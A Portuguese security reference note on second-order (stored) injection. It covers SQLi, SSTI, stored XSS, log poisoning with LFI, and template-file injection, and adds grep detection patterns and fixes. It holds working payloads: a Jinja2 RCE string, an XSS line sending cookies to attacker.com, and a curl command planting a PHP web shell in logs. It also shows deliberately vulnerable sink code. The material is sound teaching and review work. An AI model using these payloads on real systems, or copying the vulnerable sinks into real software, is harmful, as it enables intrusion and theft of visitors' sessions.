# Second-Order Injection

**Tags:** #alto #critico #second-order #injecao #persistencia
**OWASP:** A03:2021  Injection
**CVSS Base:** Herdado da vulnerabilidade de injeção subjacente

---

## 📖 O que é

Second-Order Injection (ou Stored Injection) ocorre em duas fases:

1. **Fase 1  Armazenamento:** O dado malicioso entra "sanitizado" (ou sem sanitização mas sem detonar imediatamente) e é **persistido**  banco de dados, log, arquivo de configuração, cache.

2. **Fase 2  Detonação:** O dado é **re-lido** em um contexto diferente, sem nova sanitização, e explode como injeção.

> *"O dado entra como cordeiro, hiberna no banco, e acorda como lobo."*

---

## 🎯 Padrões por Vetor

### SQLi de Segunda Ordem

```python
# Fase 1  Registro (parece seguro com escape)
username = "'admin'--"  # input malicioso
# Aplicação escapa o apostrofo ao inserir
db.execute("INSERT INTO users (username) VALUES (%s)", (username,))
# username é salvo NO BANCO como: 'admin'--  (sem o escape na busca futura)
```

```python
# Fase 2  Uso posterior SEM nova sanitização  
@app.post('/change-password')
def change_password():
    username = current_user.username  # lido do banco = "admin'--"
    new_password = request.form['new_password']
    
    # SINK  usando o username do banco em query concatenada
    db.execute(
        f"UPDATE users SET password='{new_password}' WHERE username='{username}'"
        #   username = admin'--  torna WHERE inoperante  muda senha de TODOS
    )
```

**Kill Chain:**
```
Registro "admin'--"  banco salvo 
 change_password  
  UPDATE users SET password='X' WHERE username='admin'--'
   SQL: UPDATE users SET password='X' WHERE username='admin' --'  
   Muda a senha do usuário real 'admin' (ou de todos se 1=1)
```

---

### SSTI de Segunda Ordem

```python
# Fase 1  Salvar bio com template payload
POST /api/profile/update
{"bio": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"}
# bio é salvo no banco COM o payload

# Fase 2  Renderização do perfil público
@app.get('/profile/<username>')
def profile(username):
    user = User.query.filter_by(username=username).first()
    # Renderiza o bio diretamente no template!
    return render_template_string(f"<div>{user.bio}</div>")
    #  bio do banco = payload Jinja2  RCE
```

---

### XSS de Segunda Ordem (Stored XSS)

```javascript
// Fase 1  Comentário com script salvo no banco
POST /api/comments
{"content": "<script>document.location='https://attacker.com/?c='+document.cookie</script>"}

// Fase 2  Página de comentários renderiza sem sanitização
app.get('/comments', async (req, res) => {
    const comments = await Comment.findAll();
    // innerHTML = XSS para qualquer visitante da página
    res.send(`<div id="comments">${comments.map(c => c.content).join('')}</div>`);
});
```

---

### LFI de Segunda Ordem via Logs (Log Poisoning)

```bash
# Fase 1  Injetar PHP nos logs via User-Agent
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/
# O Web server loga o UA sem sanitização no access.log

# Fase 2  LFI que include() o log
http://target.com/?page=../../var/log/apache2/access.log&cmd=id
# PHP engine executa o código injetado no log  RCE
```

---

### Template/Config File Injection de Segunda Ordem

```python
# Fase 1  Salvar "template" malicioso em arquivo de config
POST /api/templates/save
{"name": "evil", "content": "{{7*7}} or {{config.__class__...}}"}
# arquivo templates/evil.html criado com payload

# Fase 2  Sistema usa o template salvo com um engine vulnerável
result = render_template('evil.html')  #  Execução do payload
```

---

## 🔍 `grep_search` Para Detectar Second-Order

```
# Verificar onde dados lidos do banco são reusados em sinks
# Buscar por padrões de "ler do banco e usar em sink"

user\.(username|name|email|bio|description)  # campos do ORM
session\[                                    # valores de sessão
request\.user\.                              # Django: campos do user autenticado
current_user\.                               # Flask-Login: campos do user atual

# Depois verificar se o valor é passado para:
query(
execute(
render_template_string(
system(
exec(
innerHTML
```

---

## 🧠 Protocolo de Detecção

```
Para cada operação de ESCRITA no banco/arquivo:

1. Registrar MENTALMENTE: "este dado (X) foi salvo com estes campos em (Tabela Y)"

2. Buscar TODAS as queries que LEEM os campos de Tabela Y

3. Para cada leitura: rastrear para onde o valor lido é passado
    É passado para um sink? (query SQL, template, shell, arquivo)
    há re-sanitização antes do sink? (geralmente não!)

4. Se leitura  sink sem sanitização = Second-Order Injection confirmada
```

---

## 🛡️ Correção

**Regra fundamental:** sanitizar no **ponto de uso** (sink), não apenas no ponto de entrada.

```python
#  CORRETO  sanitizar no momento de usar em query, não ao salvar
@app.post('/change-password')
def change_password():
    username = current_user.username  # lido do banco
    new_password = request.form['new_password']
    
    # Parametrização protege independente do que está no banco
    db.execute(
        "UPDATE users SET password = %s WHERE username = %s",
        (hash_password(new_password), username)
    )
```

```python
#  CORRETO  para templates: nunca renderizar conteúdo do banco como string de template
# render_template() com variável de contexto é seguro
return render_template('profile.html', bio=user.bio)  # seguro  bio é contexto, não expr
# render_template_string(user.bio) # NUNCA  render direto do conteúdo do banco  SSTI
```

---

## 🔗 Chain Exploits

```
Second-Order SQLi + campo de username  Modificar senha de outros usuários
Second-Order SSTI em bio  RCE via perfil público (sem autenticação após inserção)
Log Poisoning (Second-Order) + LFI  RCE via logs
Second-Order XSS em comentários  Roubo massivo de cookies de visitantes
Second-Order Config Injection  Comprometimento do sistema via template malicioso
```

---

## 📌 Referências
- [[sql-injection-sqli]]
- [[ssti-server-side-template-injection]]
- [[xss-cross-site-scripting]]
- [[path-traversal-lfi]]
- [[taint-analysis-cognitivo]]
